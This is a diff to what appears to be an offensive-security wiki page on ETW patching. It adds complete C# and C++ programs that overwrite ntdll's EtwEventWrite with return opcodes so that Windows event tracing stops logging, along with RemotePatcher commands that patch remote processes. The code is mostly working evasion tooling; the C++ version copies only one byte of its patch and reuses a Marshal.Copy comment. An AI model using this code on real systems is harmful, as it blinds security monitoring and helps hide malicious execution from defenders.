@@ -75,39 +75,131 @@ At a high level, ETW patching on x64bits systems can be broken up into five step
 4. Reset memory permissions of the function (optional)
 5. Flush the instruction cache (optional)
 
-<pre class="language-csharp"><code class="lang-csharp">//we need to obtain a handle for the address of EtwEventWrite
-var ntdll = Win32.LoadLibrary("ntdll.dll");
-var etwFunction = Win32.GetProcAddress(ntdll, "EtwEventWrite");
+```csharp
+using System;
+using System.ComponentModel;
+using System.Reflection;
+using System.Runtime.InteropServices;
 
-//we need to modify the memory permissions of the function to allow us to write to the function
-uint oldProtect;
-Win32.VirtualProtect(
-	etwFunction, 
-	(UIntPtr)patch.Length, 
-	0x40, 
-	out oldProtect
-);
+namespace test
+{
+    class Win32
+    {
+        [DllImport("kernel32")]
+        public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
 
-//the function has the permissions we need to write to it, and we have the pre-defined opcode to patch it. 
-//Because we are writing to a function and not a process, we can use the infamous Marshal.Copy to write our opcode
-<strong>patch(new byte[] { 0xc2, 0x14, 0x00 });
-</strong>Marshal.Copy(
-	patch, 
-	0, 
-	etwEventSend, 
-	patch.Length
-);
+        [DllImport("kernel32")]
+        public static extern IntPtr LoadLibrary(string name);
 
-//we can begin cleaning our steps to restore memory permissions as they were.
-VirtualProtect(etwFunction, 4, oldProtect, &#x26;oldOldProtect);
+        [DllImport("kernel32")]
+        public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);
 
-//we can ensure the patched function will be executed from the instruction cache.
-Win32.FlushInstructionCache(
-	etwFunction,
-	NULL
-);
+        [DllImport("kernel32.dll", SetLastError = true)]
+        public static extern bool FlushInstructionCache(IntPtr hProcess, IntPtr lpBaseAddress, UIntPtr dwSize);
 
-</code></pre>
+        [DllImport("kernel32.dll", SetLastError = true)]
+        public static extern IntPtr GetCurrentProcess();
+    }
+
+    class Program
+    {
+        static void Main(string[] args)
+        {
+
+            // Used for x86
+            PatchEtw(new byte[] { 0xc2, 0x14, 0x00 });
+
+            // Patch for x64: xor rax, rax; ret
+            //PatchEtw(new byte[] { 0x48, 0x33, 0xc0, 0xc3 }); 
+
+            Console.WriteLine("ETW Now Unhooked, further calls or Assembly.Load will not be logged");
+            Console.ReadLine();
+            //Assembly.Load(new byte[] { });
+        }
+
+        private static void PatchEtw(byte[] patch)
+        {
+            try
+            {
+                uint oldProtect;
+                uint oldOldProtect;
+
+                //we need to obtain a handle for the address of EtwEventWrite
+                var ntdll = Win32.LoadLibrary("ntdll.dll");
+                var etwEventSend = Win32.GetProcAddress(ntdll, "EtwEventWrite");
+
+                //we need to modify the memory permissions of the function to allow us to write to the function
+                Win32.VirtualProtect(etwEventSend, (UIntPtr)patch.Length, 0x40, out oldProtect);
+
+                //the function has the permissions we need to write to it, and we have the pre-defined opcode to patch it. 
+                //Because we are writing to a function and not a process, we can use the infamous Marshal.Copy to write our opcode
+                Marshal.Copy(patch, 0, etwEventSend, patch.Length);
+
+                //we can begin cleaning our steps to restore memory permissions as they were.
+                Win32.VirtualProtect(etwEventSend,(UIntPtr)4, oldProtect,out oldOldProtect);
+
+                //we can ensure the patched function will be executed from the instruction cache.
+                Win32.FlushInstructionCache(Win32.GetCurrentProcess(), etwEventSend, (UIntPtr)patch.Length);
+            
+            }
+            catch
+            {
+                Console.WriteLine("Error unhooking ETW");
+            }
+        }
+    }
+}
+```
+{% endtab %}
+
+{% tab title="C++" %}
+At a high level, ETW patching on x64bits systems can be broken up into five steps:
+
+1. Obtain a handle for `EtwEventWrite`
+2. Modify memory permissions of the function
+3. Write opcode bytes to memory
+4. Reset memory permissions of the function (optional)
+5. Flush the instruction cache (optional)
+
+```cpp
+#include <iostream>
+#include <windows.h>
+
+int main()
+{
+	//x64 patch: xor rax, rax; ret 
+    	unsigned char etwPatch[] = { 0x48, 0x33, 0xc0, 0xc3 };
+	//x86 patch: xor rax, rax; ret 
+	//unsigned char etwPatch[] = { 0xc2, 0x14, 0x00 };
+	DWORD dwOld = 0;
+	
+	//we need to obtain a handle for the address of EtwEventWrite
+	FARPROC ptrNtTraceEvent = GetProcAddress(LoadLibrary(L"ntdll.dll"), "EtwEventWrite");
+	
+	//we need to modify the memory permissions of the function to allow us to write to the function
+	VirtualProtect(ptrNtTraceEvent, 1, PAGE_EXECUTE_READWRITE, &dwOld);
+	
+	//the function has the permissions we need to write to it, and we have the pre-defined opcode to patch it. 
+        //Because we are writing to a function and not a process, we can use the infamous Marshal.Copy to write our opcode
+	memcpy(ptrNtTraceEvent, etwPatch, 1);
+	
+	//we can begin cleaning our steps to restore memory permissions as they were.
+	VirtualProtect(ptrNtTraceEvent, 1, dwOld, &dwOld);
+	
+}
+```
+{% endtab %}
+
+{% tab title="Remote Process Patching" %}
+We can perform similar patch but for a remote process with an handle on the target process. We may use the [RemotePatcher](https://github.com/Hagrid29/RemotePatcher) tool from @Hagrid29.
+
+```powershell
+#Patch ETW on a remote process and do not patch AMSI
+cmd> .\RemotePatcher.exe --pid 9756 -na
+
+#Patch ETW on the program that will be executed and patched
+cmd> .\RemotePatcher.exe --exe c:\Users\Pwned\evil.exe -na
+```
 {% endtab %}
 {% endtabs %}
 
